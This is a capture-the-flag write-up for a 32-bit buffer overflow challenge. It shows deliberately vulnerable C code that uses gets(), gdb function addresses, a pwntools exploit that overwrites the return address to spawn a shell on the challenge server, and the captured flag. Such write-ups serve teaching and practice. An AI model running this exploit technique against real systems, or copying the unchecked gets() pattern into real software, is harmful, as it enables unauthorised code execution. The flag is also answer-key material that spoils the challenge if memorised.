## Name: Baby Buffer Overflow - 32bit
#### Author: @aenygma
#### Category: PWN
#### Difficulty: N/D
#### Description: Can you command this program to where it cannot go? To get the flag, you must somehow take control of its excecution. Is it even possible?

## Procedure
The chall shows us the following code 
```
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}

```
### Babybuf content
* target() function prints "Jackpot!" and attempts to execute /bin/bash, opening a shell if the function is successfully called.
* vuln() declares a buffer buf with 16 bytes. Using gets(buf) here allows an arbitrary-length input, creating a buffer overflow vulnerability. By entering more than 16 bytes, you can overwrite the return address on the stack and redirect execution to target.

Opening the file with gdb and running ```info functions```, this show us the target addr ```0x080491f5``` we will need it to override the eip later.

```
0x08049020  gets@plt
0x08049030  execve@plt
0x08049040  puts@plt
0x08049050  fflush@plt
0x08049060  setbuf@plt
0x08049070  __libc_start_main@plt
0x08049080  _start
0x080490d2  __x86.get_pc_thunk.bx
0x080490e0  deregister_tm_clones
0x08049120  register_tm_clones
0x08049160  __do_global_dtors_aux
0x080491b0  frame_dummy
0x080491f5  target
0x08049236  vuln
0x08049252  main
```

I wrote the following python code.
```
from pwn import *

context(log_level='debug',os='linux',arch='i386')

r = remote('challenge.ctf.games',31053)

offset = 16
target = p32(0x080491f5)
eax = b"AAAA"
ebx = b"AAAA"
ecx = b"AAAA"

payload = offset * b'A' + eax + ebx + ecx + target
r.sendlineafter(b'Gimme some data!',payload)
r.interactive()
```

<img width="1046" alt="Screenshot 2024-10-25 at 10 06 42 AM" src="https://github.com/user-attachments/assets/5621b80c-031a-4295-b037-0a65a362febd">


flag{4cd3b4079393e861af489ca063373f98}
